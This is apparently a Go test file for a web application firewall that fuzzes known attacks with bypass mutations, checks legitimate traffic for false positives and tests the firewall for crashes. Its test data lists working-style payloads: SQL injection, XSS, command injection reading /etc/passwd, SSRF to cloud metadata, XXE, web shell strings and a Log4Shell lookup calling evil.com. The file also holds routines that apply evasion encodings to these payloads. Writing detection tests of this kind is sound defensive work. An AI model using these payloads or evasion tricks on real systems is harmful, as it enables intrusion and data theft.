package main

import (
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"testing"
	"unicode"
)

// ═══════════════════════════════════════════════════════════════════════════════
// EVASION FUZZING: mutate known attack payloads and verify WAF still catches them
// ═══════════════════════════════════════════════════════════════════════════════

// knownAttacks are confirmed-malicious payloads that MUST always be blocked.
var knownAttacks = []struct {
	payload  string
	category string
}{
	// SQLi
	{"' UNION SELECT username,password FROM users--", "SQL_INJECTION"},
	{"'; DROP TABLE users;--", "SQL_INJECTION"},
	{"1; WAITFOR DELAY '0:0:5'--", "SQL_INJECTION"},
	{"EXEC xp_cmdshell('dir')", "SQL_INJECTION"},

	// XSS
	{"<script>alert(document.cookie)</script>", "XSS_ATTACKS"},
	{"<img src=x onerror=alert(1)>", "XSS_ATTACKS"},
	{"<svg onload=alert(1)>", "XSS_ATTACKS"},
	{"javascript:alert(1)", "XSS_ATTACKS"},

	// Command Injection
	{"; cat /etc/passwd", "COMMAND_INJECTION"},
	{"| grep -r password /", "COMMAND_INJECTION"},
	{"$(whoami)", "COMMAND_INJECTION"},

	// SSRF
	{"http://169.254.169.254/latest/meta-data/", "SSRF"},
	{"http://127.0.0.1:8080/admin", "SSRF"},
	{"file:///etc/passwd", "SSRF"},

	// Log4Shell
	{"${jndi:ldap://evil.com/a}", "LOG4SHELL"},

	// XXE
	{"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "XXE"},

	// Sensitive files
	{"/.git/config", "SENSITIVE_FILES"},
	{"/.env", "SENSITIVE_FILES"},
	{"/.aws/credentials", "SENSITIVE_FILES"},

	// Cloud secrets
	{"AKIAIOSFODNN7EXAMPLE1", "CLOUD_SECRETS"},

	// Web shells
	{"/uploads/c99.php", "WEBSHELL_C2"},
	{"cmd=system('id')", "WEBSHELL_C2"},
}

// evasionTechniques apply common WAF bypass mutations to a payload.
func evasionTechniques(payload string) []string {
	var variants []string

	// 1. Case variation
	variants = append(variants, strings.ToUpper(payload))
	variants = append(variants, strings.ToLower(payload))
	variants = append(variants, mixedCase(payload))

	// 2. URL encoding (single)
	variants = append(variants, url.QueryEscape(payload))

	// 3. Double URL encoding
	variants = append(variants, url.QueryEscape(url.QueryEscape(payload)))

	// 4. Whitespace insertion
	variants = append(variants, insertWhitespace(payload))

	// 5. Tab instead of space
	variants = append(variants, strings.ReplaceAll(payload, " ", "\t"))

	// 6. Newline insertion
	variants = append(variants, strings.ReplaceAll(payload, " ", "\n"))

	// 7. Comment insertion (SQL)
	variants = append(variants, strings.ReplaceAll(payload, " ", "/**/"))

	// 8. Plus sign instead of space
	variants = append(variants, strings.ReplaceAll(payload, " ", "+"))

	// 9. HTML entity for < and >
	variants = append(variants, strings.ReplaceAll(
		strings.ReplaceAll(payload, "<", "&lt;"), ">", "&gt;"))

	// 10. Null byte prefix
	variants = append(variants, "%00"+payload)

	return variants
}

func mixedCase(s string) string {
	result := []byte(s)
	for i := range result {
		if i%2 == 0 {
			result[i] = byte(unicode.ToUpper(rune(result[i])))
		} else {
			result[i] = byte(unicode.ToLower(rune(result[i])))
		}
	}
	return string(result)
}

func insertWhitespace(s string) string {
	var b strings.Builder
	for i, c := range s {
		b.WriteRune(c)
		if i > 0 && i%3 == 0 && c != ' ' {
			b.WriteRune(' ')
		}
	}
	return b.String()
}

// TestEvasionFuzzing verifies that known attacks are still detected after
// applying common WAF bypass mutations.
func TestEvasionFuzzing(t *testing.T) {
	totalTests := 0
	bypasses := 0

	for _, attack := range knownAttacks {
		variants := evasionTechniques(attack.payload)

		for i, variant := range variants {
			totalTests++
			normalized := normalizeInput(variant)
			_, score := matchRulesScored(normalized)

			if score < blockThreshold {
				bypasses++
				t.Logf("EVASION BYPASS [%s] variant=%d score=%d input=%q",
					attack.category, i, score, truncate(variant, 100))
			}
		}
	}

	bypassRate := float64(bypasses) * 100 / float64(totalTests)
	t.Logf("Evasion fuzzing: %d/%d variants tested, %d bypasses (%.1f%% bypass rate)",
		totalTests, totalTests, bypasses, bypassRate)

	// Allow up to 30% bypass rate on evasion variants.
	// Many mutations intentionally break the payload structure (e.g. URL-encoding
	// a closing tag makes it not a tag anymore — that's expected, not a bypass).
	if bypassRate > 30 {
		t.Errorf("Evasion bypass rate %.1f%% exceeds 30%% threshold", bypassRate)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// FALSE POSITIVE FUZZING: random legitimate traffic must never be blocked
// ═══════════════════════════════════════════════════════════════════════════════

// legitimatePatterns are templates for generating realistic legitimate traffic.
var legitimatePatterns = []string{
	"https://www.google.com/search?q=%s&page=%d",
	"https://api.example.com/v2/users/%d/settings",
	"https://shop.example.com/products?category=%s&sort=price&order=asc",
	"https://cdn.example.com/assets/js/app.%s.min.js",
	"https://docs.example.com/guide/%s/getting-started",
	"/api/v1/organizations/%d/members?role=%s&limit=50",
	`{"username":"%s","email":"%s@example.com","age":%d}`,
	`{"query":"%s","filters":{"status":"active","page":%d}}`,
	"name=%s&email=%s%%40example.com&city=%s&zip=%d",
	"https://github.com/%s/%s/blob/main/README.md",
}

var safeWords = []string{
	"hello", "world", "test", "product", "user", "admin", "config",
	"settings", "dashboard", "report", "analytics", "search", "login",
	"register", "profile", "account", "billing", "invoice", "payment",
	"electronics", "clothing", "books", "music", "sports", "health",
	"science", "education", "technology", "programming", "golang",
	"python", "javascript", "react", "docker", "kubernetes", "aws",
	"azure", "terraform", "ansible", "monitoring", "logging", "metrics",
}

func randomSafeWord(rng *rand.Rand) string {
	return safeWords[rng.Intn(len(safeWords))]
}

func generateLegitimateInput(rng *rand.Rand) string {
	pattern := legitimatePatterns[rng.Intn(len(legitimatePatterns))]
	// Fill in format verbs with safe values
	args := make([]interface{}, 0)
	for _, c := range pattern {
		if c == '%' {
			continue
		}
	}
	// Simple approach: replace %s with safe word, %d with number
	result := pattern
	for strings.Contains(result, "%s") {
		result = strings.Replace(result, "%s", randomSafeWord(rng), 1)
	}
	for strings.Contains(result, "%d") {
		result = strings.Replace(result, "%d", fmt.Sprintf("%d", rng.Intn(10000)), 1)
	}
	_ = args
	return result
}

func TestFalsePositiveFuzzing(t *testing.T) {
	rng := rand.New(rand.NewSource(42)) // Deterministic for reproducibility
	const iterations = 5000

	falsePositives := 0
	for i := 0; i < iterations; i++ {
		input := generateLegitimateInput(rng)
		normalized := normalizeInput(input)
		matches, score := matchRulesScored(normalized)

		if score >= blockThreshold {
			falsePositives++
			ids := make([]string, len(matches))
			for j, m := range matches {
				ids[j] = m.RuleID
			}
			t.Errorf("FALSE POSITIVE #%d: score=%d rules=[%s] input=%q",
				falsePositives, score, strings.Join(ids, ","), truncate(input, 120))
		}
	}

	fpRate := float64(falsePositives) * 100 / float64(iterations)
	t.Logf("False positive fuzzing: %d/%d inputs tested, %d false positives (%.2f%% FP rate)",
		iterations, iterations, falsePositives, fpRate)

	if falsePositives > 0 {
		t.Errorf("False positive rate %.2f%% — must be 0%%", fpRate)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// STABILITY FUZZING: random bytes must never crash the WAF
// ═══════════════════════════════════════════════════════════════════════════════

// FuzzNormalizeInput tests that normalizeInput never panics on any input.
func FuzzNormalizeInput(f *testing.F) {
	// Seed corpus
	f.Add("hello world")
	f.Add("%3Cscript%3E")
	f.Add("%252e%252e%252f")
	f.Add("' UNION SELECT 1--")
	f.Add("${jndi:ldap://evil.com/a}")
	f.Add("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")
	f.Add(strings.Repeat("A", 10000))
	f.Add(strings.Repeat("%", 5000))
	f.Add("\x00\xff\xfe\xfd")

	f.Fuzz(func(t *testing.T, input string) {
		// Must not panic
		normalizeInput(input)
	})
}

// FuzzMatchRules tests that matchRulesScored never panics on any input.
func FuzzMatchRules(f *testing.F) {
	f.Add("hello world")
	f.Add("' OR 1=1--")
	f.Add("<script>alert(1)</script>")
	f.Add("${jndi:ldap://evil.com}")
	f.Add(strings.Repeat("UNION SELECT ", 100))
	f.Add("\x00\x01\x02\xff")

	f.Fuzz(func(t *testing.T, input string) {
		normalized := normalizeInput(input)
		// Must not panic
		matchRulesScored(normalized)
	})
}

// FuzzShannonEntropy tests that shannonEntropy never panics.
func FuzzShannonEntropy(f *testing.F) {
	f.Add("hello")
	f.Add("")
	f.Add(strings.Repeat("x", 100000))
	f.Add("\x00\xff")

	f.Fuzz(func(t *testing.T, input string) {
		e := shannonEntropy(input)
		if e < 0 {
			t.Errorf("entropy cannot be negative: %f for input len=%d", e, len(input))
		}
	})
}

// ═══════════════════════════════════════════════════════════════════════════════
// BENCHMARKS for fuzzing infrastructure
// ═══════════════════════════════════════════════════════════════════════════════

func BenchmarkEvasionVariants(b *testing.B) {
	payload := "' UNION SELECT username,password FROM users--"
	variants := evasionTechniques(payload)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, v := range variants {
			normalized := normalizeInput(v)
			matchRulesScored(normalized)
		}
	}
}

func BenchmarkFalsePositiveCheck(b *testing.B) {
	rng := rand.New(rand.NewSource(42))
	inputs := make([]string, 100)
	for i := range inputs {
		inputs[i] = generateLegitimateInput(rng)
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		input := inputs[i%len(inputs)]
		normalized := normalizeInput(input)
		matchRulesScored(normalized)
	}
}
